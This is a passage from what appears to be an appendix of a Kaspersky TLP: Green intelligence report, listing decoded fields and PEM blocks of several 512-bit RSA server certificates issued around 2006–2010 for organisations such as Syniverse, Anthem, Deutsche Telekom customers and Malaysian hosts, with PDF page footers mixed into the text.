 orHl8vgwOgYDVR0fBDMwMTAvoC2gK4YpaHR0cDovL2NybC5nbG9iYWxzaWduLm5l
 dC9lZHVjYXRpb25hbC5jcmwwTwYIKwYBBQUHAQEEQzBBMD8GCCsGAQUFBzAChjNo
 dHRwOi8vc2VjdXJlLmdsb2JhbHNpZ24ubmV0L2NhY2VydC9lZHVjYXRpb25hbC5j
 cnQwEQYJYIZIAYb4QgEBBAQDAgbAMA0GCSqGSIb3DQEBBQUAA4IBAQBxmarJkibu
 Mi3AlfgWR7fZ6y7xk9LDPWLBmnTSLymcCKjKUmxCxCunHJYXrz0BtbXxcNAI4fpj
 4USyYWY9nFo/OjKwRzE9Jx2YnNPDx59zVYz/1yEtdtLn34ue0+7FXudqunq7e544
 AFTtWO4AwUWL1GMlviKYqO/ws/j7FTLorton5GBG1nV4UB1XTQbpjLhD9ZpYz6H0
 x8fsSrCKlcdsO1AKRXTx1gLgeKfx8VVuIJJVN762V3Y3/2Aww5osDt3Y7yu/HyCd
 pSGTlJoeWHS4JM6kOHsdOP3ynyHASdGUPjh+YwwLw5jqVrKQktx1DQYLNZyU1uG+
 eQXRJ7OHIxQK
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 01:00:00:00:00:01:1f:71:6f:21:66
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: O=GlobalSign Inc, CN=Cybertrust SureServer CA
        Validity
           Not Before: Feb 13 19:59:00 2009 GMT
           Not After : Feb 13 19:59:00 2011 GMT
        Subject: CN=agreement.syniverse.com,
        C=US/emailAddress=belinda.jablonski@syniverse.com,
        L=Tampa, O=Syniverse Technologies Inc., OU=Crossroads,
        ST=Florida
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:a5:13:53:17:02:f7:cd:33:64:7d:e8:27:8f:e9:
                 bc:ab:db:96:3b:41:0d:b6:c4:2a:10:d5:64:58:87:
                 ac:62:de:09:2e:c5:5f:79:c5:d5:9e:26:9b:1a:9a:
                 e3:99:3b:e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5:
                 40:7f:bb:e9:35
              Exponent: 65537 (0x10001)
        X509v3 extensions:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
           Netscape Cert Type:
              SSL Client, SSL Server
           X509v3 Key Usage: critical
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
           X509v3 Authority Key Identifier:
              keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD:E8:30:B
              6:5B:84:89:23
           X509v3 CRL Distribution Points:
              Full Name:
                  URI:http://crl.globalsign.net/sureserver.crl
           X509v3 Basic Constraints: critical
              CA:FALSE
     Signature Algorithm: sha1WithRSAEncryption
        60:dd:4f:65:17:a0:3d:47:d7:70:d7:96:17:41:1c:b0:89:38:
        9c:7e:bd:74:21:90:60:b4:04:d0:8d:12:81:a2:d5:c1:89:92:
        8a:5e:6a:ae:c9:df:0a:78:e9:70:7f:b9:9b:3e:08:ab:74:6b:
        ab:99:cb:9b:f4:1e:61:53:7f:13:3f:5b:26:ea:57:11:fa:d7:
        3b:90:8c:59:23:d4:73:66:9e:aa:47:72:04:9a:bf:d8:29:aa:
        c1:4d:f3:32:e5:c3:26:8a:98:da:07:bf:b7:07:0e:1a:4e:a2:
        13:51:c6:2c:11:7f:2c:40:c6:0f:a1:4d:51:6a:33:7b:9d:52:
        9b:4b:f9:85:6a:13:44:81:2e:8f:a9:2d:ce:29:57:54:3b:d8:
        1b:d8:20:5a:c1:46:16:93:3f:34:e3:4a:5a:e8:54:f2:9b:b6:
        14:4a:10:9b:db:d4:33:7b:76:13:29:c9:f8:44:02:98:94:5d:
        09:30:a0:a3:f0:94:1c:94:48:83:03:66:2c:40:92:b4:75:44:
        35:f4:8d:be:21:51:47:86:cd:fb:67:55:6d:a6:17:df:79:3f:
        31:31:63:97:fc:8d:1a:14:9c:7e:68:13:bc:1b:2b:54:c9:a7:
        e3:05:8a:f7:43:0a:06:6d:07:e3:f3:34:1d:92:be:30:9d:95:
        05:8c:35:ba
 BEGIN CERTIFICATE
 MIIDRzCCAi+gAwIBAgILAQAAAAABH3FvIWYwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
 A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
 cnZlciBDQTAeFw0wOTAyMTMxOTU5MDBaFw0xMTAyMTMxOTU5MDBaMIG8MSAwHgYD
 VQQDExdhZ3JlZW1lbnQuc3luaXZlcnNlLmNvbTELMAkGA1UEBhMCVVMxLjAsBgkq
 hkiG9w0BCQEWH2JlbGluZGEuamFibG9uc2tpQHN5bml2ZXJzZS5jb20xDjAMBgNV
 BAcTBVRhbXBhMSQwIgYDVQQKExtTeW5pdmVyc2UgVGVjaG5vbG9naWVzIEluYy4x
 EzARBgNVBAsTCkNyb3Nzcm9hZHMxEDAOBgNVBAgTB0Zsb3JpZGEwXDANBgkqhkiG
 9w0BAQEFAANLADBIAkEApRNTFwL3zTNkfegnj+m8q9uWO0ENtsQqENVkWIesYt4J
 LsVfecXVniabGprjmTviLkh+nF90yTQJs6VAf7vpNQIDAQABo4GQMIGNMBEGCWCG
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                            39
 SAGG+EIBAQQEAwIGwDAOBgNVHQ8BAf8EBAMCBPAwHwYDVR0jBBgwFoAUKzdTk2RH
 ZiNPANP33egwtluEiSMwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5nbG9i
 YWxzaWduLm5ldC9zdXJlc2VydmVyLmNybDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3
 DQEBBQUAA4IBAQBg3U9lF6A9R9dw15YXQRywiTicfr10IZBgtATQjRKBotXBiZKK
 Xmquyd8KeOlwf7mbPgirdGurmcub9B5hU38TP1sm6lcR+tc7kIxZI9RzZp6qR3IE
 mr/YKarBTfMy5cMmipjaB7+3Bw4aTqITUcYsEX8sQMYPoU1RajN7nVKbS/mFahNE
 gS6PqS3OKVdUO9gb2CBawUYWkz8040pa6FTym7YUShCb29Qze3YTKcn4RAKYlF0J
 MKCj8JQclEiDA2YsQJK0dUQ19I2+IVFHhs37Z1VtphffeT8xMWOX/I0aFJx+aBO8
 GytUyafjBYr3QwoGbQfj8zQdkr4wnZUFjDW6
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2786749 (0x2a85bd)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=MY, O=Digicert Sdn. Bhd., OU=457608K,
        CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Mar 29 04:26:21 2010 GMT
           Not After : Mar 29 04:26:21 2012 GMT
        Subject: C=MY, O=Digicert Sdn. Bhd., CN=mcrs2.digicert.
        com.my, L=Kuala Lumpur
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                 00:c2:f6:81:3d:67:9c:8a:93:22:6f:c1:cf:a9:85:
                 ec:d1:40:b6:79:ea:02:47:88:c2:bb:dd:59:97:49:
                 f5:59:a8:be:0d:10:17:79:9b:0b:ee:a5:4c:7a:db:
                 73:d8:26:49:76:2b:4f:fc:4e:aa:1d:e1:57:22:d5:
                 0b:cd:d5:da:69
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Subject Key Identifier:
              42:C0:71:88:BF:7B:00:93
           X509v3 Certificate Policies:
              Policy: 2.16.458.1.1
              CPS: http://www.digicert.com.my/cps.htm
           X509v3 Authority Key Identifier:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
              keyid:C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D:C
              5:74:6E:84:77
           X509v3 Key Usage:
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
     Signature Algorithm: sha1WithRSAEncryption
        39:ec:d4:6b:f2:e7:d4:47:5e:59:6e:bf:83:59:7b:32:17:cb:
        4e:37:e7:2d:5c:44:ea:68:08:94:e9:47:33:cb:e2:cc:ad:c7:
        cc:28:f1:07:a7:9a:f6:f8:55:76:c4:31:72:98:e3:11:5b:aa:
        d5:d6:ff:99:52:69:61:48:91:31:df:ff:d3:39:f0:d1:94:29:
        55:5b:6e:d1:d7:2d:da:7c:ef:6e:a4:10:fd:b4:22:4b:9e:41:
        85:f6:63:b6:e7:10:5c:88:1e:04:20:36:48:22:f5:ba:a4:8c:
        24:d3:81:78:c1:c1:d3:c9:8c:ba:a5:62:e6:e3:a8:e8:e4:21:
        d5:72
 BEGIN CERTIFICATE
 MIICgzCCAeygAwIBAgIDKoW9MA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
 MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
 MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMTAwMzI5
 MDQyNjIxWhcNMTIwMzI5MDQyNjIxWjBhMQswCQYDVQQGEwJNWTEbMBkGA1UEChMS
 RGlnaWNlcnQgU2RuLiBCaGQuMR4wHAYDVQQDExVtY3JzMi5kaWdpY2VydC5jb20u
 bXkxFTATBgNVBAcTDEt1YWxhIEx1bXB1cjBcMA0GCSqGSIb3DQEBAQUAA0sAMEgC
 QQDC9oE9Z5yKkyJvwc+phezRQLZ56gJHiMK73VmXSfVZqL4NEBd5mwvupUx623PY
 Jkl2K0/8Tqod4Vci1QvN1dppAgMBAAGjgYowgYcwEQYDVR0OBAoECELAcYi/ewCT
 MEQGA1UdIAQ9MDswOQYFYINKAQEwMDAuBggrBgEFBQcCARYiaHR0cDovL3d3dy5k
 aWdpY2VydC5jb20ubXkvY3BzLmh0bTAfBgNVHSMEGDAWgBTGFpNOFhfsFq6MlHbz
 hm3FdG6EdzALBgNVHQ8EBAMCBPAwDQYJKoZIhvcNAQEFBQADgYEAOezUa/Ln1Ede
 WW6/g1l7MhfLTjfnLVxE6mgIlOlHM8vizK3HzCjxB6ea9vhVdsQxcpjjEVuq1db/
 mVJpYUiRMd//0znw0ZQpVVtu0dct2nzvbqQQ/bQiS55BhfZjtucQXIgeBCA2SCL1
 uqSMJNOBeMHB08mMuqVi5uOo6OQh1XI=
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 21665 (0x54a1)
        Signature Algorithm: md5WithRSAEncryption
        Issuer: C=US, O=Equifax Secure Inc., CN=Equifax Secure
        eBusiness CA1
        Validity
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
                                                                             41
           Not Before: Jun 14 15:26:42 2006 GMT
           Not After : Jul 14 15:26:42 2008 GMT
        Subject: C=US, O=www.gccustomservices.com,
        OU=businessprofile.geotrust.com/get.jsp?GT30320107, OU=See
        www.rapidssl.com/cps (c)05, OU=Domain Control Validated
        RapidSSL(R), CN=www.gccustomservices.com
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                  00:cb:1f:b0:21:9c:37:a2:39:75:02:b5:12:dc:bb:
                  f5:7a:f7:93:65:0d:f8:6c:36:68:0a:06:19:49:77:
                  da:68:9e:ea:eb:39:d4:16:49:6d:14:c0:c9:6f:53:
                  c5:ec:a8:6b:60:ca:c3:a4:5b:3b:1a:93:1d:1f:3c:
                  d8:26:d5:6e:23
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Key Usage: critical
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
           X509v3 CRL Distribution Points:
              Full Name:
                  URI:http://crl.geotrust.com/crls/ebizca1.crl
           X509v3 Authority Key Identifier:
              keyid:4A:78:32:52:11:DB:59:16:36:5E:DF:C1:14:36:40:6
              A:47:7C:4C:A1
     Signature Algorithm: md5WithRSAEncryption
        99:a5:16:0b:3e:3d:d1:a4:36:dc:09:c5:22:12:d9:cf:c5:76:
        89:4a:7b:27:be:2d:d6:53:2b:6b:a4:da:0b:f3:f5:bf:72:cc:
        11:1c:5c:a1:a3:ef:78:83:4d:01:a6:a0:e6:d8:91:2c:6c:ce:
        83:d8:be:fe:a1:14:c9:b4:ac:fc:be:8e:c3:75:1d:6a:6a:43:
        5a:a5:1c:3b:eb:aa:f4:f3:36:bc:34:63:72:2a:d8:c5:97:b6:
        a3:aa:54:91:5e:3f:3c:48:36:3c:51:37:c0:55:28:f1:a4:8f:
        ea:df:e5:2f:b2:62:bd:33:20:6a:4a:57:66:00:89:21:c4:68:
        d5:e2
 BEGIN CERTIFICATE
 MIIC3DCCAkWgAwIBAgICVKEwDQYJKoZIhvcNAQEEBQAwUzELMAkGA1UEBhMCVVMx
 HDAaBgNVBAoTE0VxdWlmYXggU2VjdXJlIEluYy4xJjAkBgNVBAMTHUVxdWlmYXgg
 U2VjdXJlIGVCdXNpbmVzcyBDQS0xMB4XDTA2MDYxNDE1MjY0MloXDTA4MDcxNDE1
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
 MjY0MlowgecxCzAJBgNVBAYTAlVTMSEwHwYDVQQKExh3d3cuZ2NjdXN0b21zZXJ2
 aWNlcy5jb20xODA2BgNVBAsTL2J1c2luZXNzcHJvZmlsZS5nZW90cnVzdC5jb20v
 Z2V0LmpzcD9HVDMwMzIwMTA3MScwJQYDVQQLEx5TZWUgd3d3LnJhcGlkc3NsLmNv
 bS9jcHMgKGMpMDUxLzAtBgNVBAsTJkRvbWFpbiBDb250cm9sIFZhbGlkYXRlZCAt
 IFJhcGlkU1NMKFIpMSEwHwYDVQQDExh3d3cuZ2NjdXN0b21zZXJ2aWNlcy5jb20w
 XDANBgkqhkiG9w0BAQEFAANLADBIAkEAyx+wIZw3ojl1ArUS3Lv1eveTZQ34bDZo
 CgYZSXfaaJ7q6znUFkltFMDJb1PF7KhrYMrDpFs7GpMdHzzYJtVuIwIDAQABo24w
 bDAOBgNVHQ8BAf8EBAMCBPAwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5n
 ZW90cnVzdC5jb20vY3Jscy9lYml6Y2ExLmNybDAfBgNVHSMEGDAWgBRKeDJSEdtZ
 FjZe38EUNkBqR3xMoTANBgkqhkiG9w0BAQQFAAOBgQCZpRYLPj3RpDbcCcUiEtnP
 xXaJSnsnvi3WUytrpNoL8/W/cswRHFyho+94g00BpqDm2JEsbM6D2L7+oRTJtKz8
 vo7DdR1qakNapRw766r08za8NGNyKtjFl7ajqlSRXj88SDY8UTfAVSjxpI/q3+Uv
 smK9MyBqSldmAIkhxGjV4g==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 27455 (0x6b3f)
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=DE, O=TSystems
        Enterprise Services GmbH, OU=Trust Center Deutsche
        Telekom, CN=Deutsche Telekom CA 5
        Validity
           Not Before: Oct 20 06:55:03 2008 GMT
           Not After : Oct 25 06:55:03 2009 GMT
        Subject: O=AIC GmbH, OU=AIC Certificate Service C06,
        L=Sindelfingen, ST=BAW, C=DE, CN=www.kuechentraum24.de
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                  00:b7:92:e8:ac:bd:17:b8:20:35:53:82:2a:c4:c9:
                  f8:b5:a5:c0:fc:c0:43:f9:c5:79:5c:43:f4:58:22:
                  6f:c4:db:c1:d2:a9:45:31:33:1e:da:73:da:7b:5a:
                  ea:2e:80:eb:30:80:fc:58:1e:1e:89:b2:15:1b:fc:
                  bc:f2:45:4d:ff
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Authority Key Identifier:
TLP: Green
         For any inquiries, please contact intelreports@kaspersky.com
                                                                             43
              keyid:B3:F5:5F:A6:02:3C:23:10:5B:71:A1:7C:B3:A7:40:8
              5:A8:85:26:B8
           X509v3 Key Usage: critical
              Digital Signature, Key Encipherment
           X509v3 Subject Key Identifier:
              80:B5:D5:2B:3F:F9:B6:18:91:23:AE:A9:27:5B:20:D4:9E:
              02:E9:A7
           X509v3 Certificate Policies:
              Policy: 1.3.6.1.4.1.7879.13.2
              CPS: http://wwwca.telesec.de/Pub_Cert/ServPass/cps/
              CPS_ServerPass_V34.pdf
           X509v3 CRL Distribution Points:
              Full Name:
                  URI:http://wwwca.telesec.de/cgibin/
                  Pub_Cert/ServPass/DwnloadCRL.crl?issuer_
                  dn=Deutsch
                  e_Telekom_CA_5
              Full Name:
                  URI:ldap://ldapserverpass.
                  telesec.de/cn=Deutsche%20Telekom%20
                  CA%205,ou=Trust%20Center%20Deutsche%20
                  Telekom,o=TSystems%20Enterprise%20Services%20
                  GmbH,c=de?certificateRevocationlist?ba-
                  se?certificateRevocationlist=*
           X509v3 Basic Constraints: critical
              CA:FALSE
           X509v3 Subject Alternative Name:
              DNS:www.kuechentraum24.de
     Signature Algorithm: sha1WithRSAEncryption
        b6:bc:98:3d:6c:44:95:50:c1:06:94:71:b1:05:2d:99:85:e3:
        db:6e:39:58:fd:f0:45:1c:0d:3c:b3:45:33:e9:66:fd:99:f0:
        b9:c0:98:8a:af:01:f5:b4:66:a7:7e:11:8a:6c:71:09:b9:fa:
        5e:66:fc:3d:03:13:f1:c6:79:7c:bb:c5:fb:b7:e5:6b:c8:e3:
        92:7e:7d:fb:87:e0:7d:5e:3e:64:6e:df:27:52:85:d3:9b:71:
        93:84:2b:38:d1:4b:10:fc:23:e2:ae:7a:cb:a7:01:d1:c5:30:
        05:76:2d:26:f5:9f:b9:5b:8c:e7:3b:3c:2d:fb:a9:10:61:40:
        2e:da:45:75:c2:c3:d1:20:8d:da:f3:72:3f:5c:7d:bd:e1:86:
        d3:43:9d:81:71:84:09:2f:13:af:e1:cb:55:c2:0d:a4:3c:d3:
        f7:f2:eb:12:22:96:a7:5d:0b:ff:b3:9f:fa:f6:cf:a3:19:82:
        93:dc:ab:a7:fe:76:10:ff:5e:32:00:d7:69:1a:a1:e6:2a:e2:
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
          31:63:d6:14:f6:69:17:d4:bc:e2:68:c9:76:71:82:14:5f:a8:
          88:f7:e2:3d:10:50:da:aa:97:96:08:f8:33:18:d2:1a:93:4f:
          5c:58:fc:c0:05:e0:31:f2:59:cf:5e:2e:f5:6a:1f:6c:0f:fa:
          34:0b:2c:c9
 BEGIN CERTIFICATE
 MIIFDTCCA/WgAwIBAgICaz8wDQYJKoZIhvcNAQEFBQAwgYIxCzAJBgNVBAYTAkRF
 MSswKQYDVQQKEyJULVN5c3RlbXMgRW50ZXJwcmlzZSBTZXJ2aWNlcyBHbWJIMSYw
 JAYDVQQLEx1UcnVzdCBDZW50ZXIgRGV1dHNjaGUgVGVsZWtvbTEeMBwGA1UEAxMV
 RGV1dHNjaGUgVGVsZWtvbSBDQSA1MB4XDTA4MTAyMDA2NTUwM1oXDTA5MTAyNTA2
 NTUwM1owgYsxETAPBgNVBAoTCEFJQyBHbWJIMSQwIgYDVQQLExtBSUMgQ2VydGlm
 aWNhdGUgU2VydmljZSBDMDYxFTATBgNVBAcTDFNpbmRlbGZpbmdlbjEMMAoGA1UE
 CBMDQkFXMQswCQYDVQQGEwJERTEeMBwGA1UEAxMVd3d3Lmt1ZWNoZW50cmF1bTI0
 LmRlMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALeS6Ky9F7ggNVOCKsTJ+LWlwPzA
 Q/nFeVxD9Fgib8TbwdKpRTEzHtpz2nta6i6A6zCA/FgeHomyFRv8vPJFTf8CAwEA
 AaOCAkgwggJEMB8GA1UdIwQYMBaAFLP1X6YCPCMQW3GhfLOnQIWohSa4MA4GA1Ud
 DwEB/wQEAwIFoDAdBgNVHQ4EFgQUgLXVKz/5thiRI66pJ1sg1J4C6acwagYDVR0g
 BGMwYTBfBgkrBgEEAb1HDQIwUjBQBggrBgEFBQcCARZEaHR0cDovL3d3d2NhLnRl
 bGVzZWMuZGUvUHViX0NlcnQvU2VydlBhc3MvY3BzL0NQU19TZXJ2ZXJQYXNzX1Yz
 NC5wZGYwggFUBgNVHR8EggFLMIIBRzBnoGWgY4ZhaHR0cDovL3d3d2NhLnRlbGVz
 ZWMuZGUvY2dpLWJpbi9QdWJfQ2VydC9TZXJ2UGFzcy9Ed25sb2FkQ1JMLmNybD8t
 aXNzdWVyX2RuPURldXRzY2hlX1RlbGVrb21fQ0FfNTCB26CB2KCB1YaB0mxkYXA6
 Ly9sZGFwLXNlcnZlcnBhc3MudGVsZXNlYy5kZS9jbj1EZXV0c2NoZSUyMFRlbGVr
 b20lMjBDQSUyMDUsb3U9VHJ1c3QlMjBDZW50ZXIlMjBEZXV0c2NoZSUyMFRlbGVr
 b20sbz1ULVN5c3RlbXMlMjBFbnRlcnByaXNlJTIwU2VydmljZXMlMjBHbWJILGM9
 ZGU/Y2VydGlmaWNhdGVSZXZvY2F0aW9ubGlzdD9iYXNlP2NlcnRpZmljYXRlUmV2
 b2NhdGlvbmxpc3Q9KjAMBgNVHRMBAf8EAjAAMCAGA1UdEQQZMBeCFXd3dy5rdWVj
 aGVudHJhdW0yNC5kZTANBgkqhkiG9w0BAQUFAAOCAQEAtryYPWxElVDBBpRxsQUt
 mYXj2245WP3wRRwNPLNFM+lm/ZnwucCYiq8B9bRmp34RimxxCbn6Xmb8PQMT8cZ5
 fLvF+7fla8jjkn59+4fgfV4+ZG7fJ1KF05txk4QrONFLEPwj4q56y6cB0cUwBXYt
 JvWfuVuM5zs8LfupEGFALtpFdcLD0SCN2vNyP1x9veGG00OdgXGECS8Tr+HLVcIN
 pDzT9/LrEiKWp10L/7Of+vbPoxmCk9yrp/52EP9eMgDXaRqh5iriMWPWFPZpF9S8
 4mjJdnGCFF+oiPfiPRBQ2qqXlgj4MxjSGpNPXFj8wAXgMfJZz14u9WofbA/6NAss
 yQ==
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 27585 (0x6bc1)
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
                                                                             45
        Signature Algorithm: sha1WithRSAEncryption
        Issuer: C=US, O=Anthem Inc, OU=Ecommerce, CN=Anthem Inc
        Certificate Authority
        Validity
           Not Before: Jan 13 19:01:43 2010 GMT
           Not After : Jan 13 19:01:43 2011 GMT
        Subject: C=US, ST=Indiana, L=Indianapolis, O=Anthem
        Companies Inc, OU=AIT, CN=www18.anthem.com
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
               PublicKey: (512 bit)
               Modulus:
                  00:a0:66:16:2a:3f:32:86:a5:e7:75:1a:3d:02:0a:
                  4c:04:ed:af:8b:92:e0:70:8f:54:64:c7:4d:18:ee:
                  51:97:2f:00:39:44:fc:6f:f6:63:9c:65:47:64:7b:
                  73:43:4a:85:2b:db:f6:f1:79:02:50:73:05:15:73:
                  f8:64:0d:b4:b7
               Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Basic Constraints: critical
               CA:FALSE
           X509v3 Subject Alternative Name:
               email:DLAITMiddleware@anthem.com
           X509v3 Key Usage: critical
               Key Encipherment
           X509v3 Authority Key Identifier:
               keyid:FA:1A:DC:3E:5D:A6:B5:FD:FA:5F:6C:CB:28:40:D3:E
               0:97:A2:AA:AC
               DirName:/C=US/O=GTE Corporation/OU=GTE CyberTrust
               Solutions, Inc./CN=GTE
               CyberTrust Global Root
               serial:07:27:16:11
           X509v3 Subject Key Identifier:
               06:EC:C3:75:99:AA:67:1E:13:4A:B7:DD:83:8A:5B:86:E3:
               8E:F9:DD
     Signature Algorithm: sha1WithRSAEncryption
        6c:0d:f7:59:c5:48:2d:c4:81:f5:be:8b:87:0b:fe:94:2d:3c:
        e4:c1:8f:ad:88:41:7f:9b:71:f6:56:8d:70:ba:ff:20:c7:6d:
        8d:52:28:0a:8f:cc:04:82:45:72:1e:0e:9f:43:7d:af:da:f3:
        07:34:b2:3a:97:5e:b4:44:31:4b:21:80:ec:ce:02:98:30:59:
TLP: Green
          For any inquiries, please contact intelreports@kaspersky.com
          dc:87:73:90:99:d1:79:ca:d8:bd:aa:cd:34:65:e2:c1:1f:78:
          c2:da:69:60:3a:ca:0b:6b:6e:dd:80:6d:fd:20:09:85:88:2c:
          9a:40:7c:fb:7d:78:ca:3e:c6:bf:81:3a:6a:09:e9:d9:c5:e8:
          57:e9:94:a2:8a:f8:c8:1f:0e:84:9b:d1:77:5a:80:b6:c3:13:
          ca:86:0a:9b:78:a0:9f:83:84:06:eb:8d:d1:17:50:78:68:b0:
          bb:99:2a:50:f7:44:92:4e:3a:ca:63:48:aa:5e:30:1b:12:89:
          b7:1d:f3:a7:4a:02:cc:da:2f:fc:e6:47:57:07:b1:33:f0:bf:
          7f:6e:26:59:62:ec:66:b8:1f:a6:09:65:7c:db:e4:c2:09:d2:
          97:e7:15:e4:34:a8:d6:f3:d2:3a:f9:20:6a:a0:a1:af:93:1b:
          ea:8c:ea:a5:2a:26:da:a0:73:ed:ed:67:f6:53:a0:84:a1:0c:
          31:ff:d8:08
 BEGIN CERTIFICATE
 MIIDpDCCAoygAwIBAgICa8EwDQYJKoZIhvcNAQEFBQAwYTELMAkGA1UEBhMCVVMx
 EzARBgNVBAoTCkFudGhlbSBJbmMxEjAQBgNVBAsTCUVjb21tZXJjZTEpMCcGA1UE
 AxMgQW50aGVtIEluYyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMTAwMTEzMTkw
 MTQzWhcNMTEwMTEzMTkwMTQzWjB+MQswCQYDVQQGEwJVUzEQMA4GA1UECBMHSW5k
 aWFuYTEVMBMGA1UEBxMMSW5kaWFuYXBvbGlzMR0wGwYDVQQKExRBbnRoZW0gQ29t
 cGFuaWVzIEluYzEMMAoGA1UECxMDQUlUMRkwFwYDVQQDExB3d3cxOC5hbnRoZW0u
 Y29tMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKBmFio/Moal53UaPQIKTATtr4uS
 4HCPVGTHTRjuUZcvADlE/G/2Y5xlR2R7c0NKhSvb9vF5AlBzBRVz+GQNtLcCAwEA
 AaOCAQ8wggELMAwGA1UdEwEB/wQCMAAwJwYDVR0RBCAwHoEcREwtQUlULU1pZGRs
 ZXdhcmVAYW50aGVtLmNvbTAOBgNVHQ8BAf8EBAMCBSAwgaIGA1UdIwSBmjCBl4AU
 +hrcPl2mtf36X2zLKEDT4JeiqqyheaR3MHUxCzAJBgNVBAYTAlVTMRgwFgYDVQQK
 Ew9HVEUgQ29ycG9yYXRpb24xJzAlBgNVBAsTHkdURSBDeWJlclRydXN0IFNvbHV0
 aW9ucywgSW5jLjEjMCEGA1UEAxMaR1RFIEN5YmVyVHJ1c3QgR2xvYmFsIFJvb3SC
 BAcnFhEwHQYDVR0OBBYEFAbsw3WZqmceE0q33YOKW4bjjvndMA0GCSqGSIb3DQEB
 BQUAA4IBAQBsDfdZxUgtxIH1vouHC/6ULTzkwY+tiEF/m3H2Vo1wuv8gx22NUigK
 j8wEgkVyHg6fQ32v2vMHNLI6l160RDFLIYDszgKYMFnch3OQmdF5yti9qs00ZeLB
 H3jC2mlgOsoLa27dgG39IAmFiCyaQHz7fXjKPsa/gTpqCenZxehX6ZSiivjIHw6E
 m9F3WoC2wxPKhgqbeKCfg4QG643RF1B4aLC7mSpQ90SSTjrKY0iqXjAbEom3HfOn
 SgLM2i/85kdXB7Ez8L9/biZZYuxmuB+mCWV82+TCCdKX5xXkNKjW89I6+SBqoKGv
 kxvqjOqlKibaoHPt7Wf2U6CEoQwx/9gI
 END CERTIFICATE
 Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2176345 (0x213559)
        Signature Algorithm: sha1WithRSAEncryption
TLP: Green
           For any inquiries, please contact intelreports@kaspersky.com
                                                                             47
        Issuer: C=MY, O=Digicert Sdn. Bhd., OU=457608K,
        CN=Digisign Server ID (Enrich)
        Validity
           Not Before: Dec 17 08:55:45 2008 GMT
           Not After : Dec 17 08:55:45 2010 GMT
        Subject: C=MY, O=JARING Communications Sdn.Bhd.,
        OU=JARING, CN=www.flexicorp.jaring.my, L=W.Persekutuan/
        emailAddress=sysadmin@jaring.my, ST=Kuala Lumpur
        Subject Public Key Info:
           Public Key Algorithm: rsaEncryption
              PublicKey: (512 bit)
              Modulus:
                  00:ed:61:d7:12:f3:94:1a:5f:d1:8b:28:35:b4:18:
                  38:d3:32:7b:7b:79:94:79:64:3d:db:bd:ad:f2:ff:
                  6c:61:fd:43:05:c1:f8:41:95:de:01:c2:ca:98:65:
                  d6:9f:bc:21:5c:35:76:9f:ff:3a:62:88:7b:32:21:
                  94:52:e1:46:ef
              Exponent: 65537 (0x10001)
        X509v3 extensions:
           X509v3 Subject Key Identifier:
              46:B9:8C:9E:2E:F7:69:2F
           X509v3 Certificate Policies:
              Policy: 2.16.458.1.1
              CPS: http://www.digicert.com.my/cps.htm
           X509v3 Authority Key Identifier:
              keyid:C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D:C
              5:74:6E:84:77
           X509v3 Key Usage:
              Digital Signature, Non Repudiation, Key
              Encipherment, Data Encipherment
     Signature Algorithm: sha1WithRSAEncryption
        7b:15:12:93:d0:13:c8:91:f1:18:a9:76:bb:87:b4:44:aa:77:
        27:05:a6:5b:95:6c:c0:6f:c5:94:7d:33:94:d3:6e:12:6f:dd:
        90:12:18:e9:a6:48:cb:d8:a4:8a:a4:68:70:92:32:fd:d8:7c:
        00:9c:db:de:7e:dd:1e:41:b0:2e:4c:48:f0:73:85:79:a8:df:
        68:45:41:97:01:06:b2:c4:9f:9d:04:6a:13:d4:6e:63:ec:bf:
        c9:00:82:f2:51:89:33:c0:3b:ba:4c:eb:8a:98:a3:28:34:30:
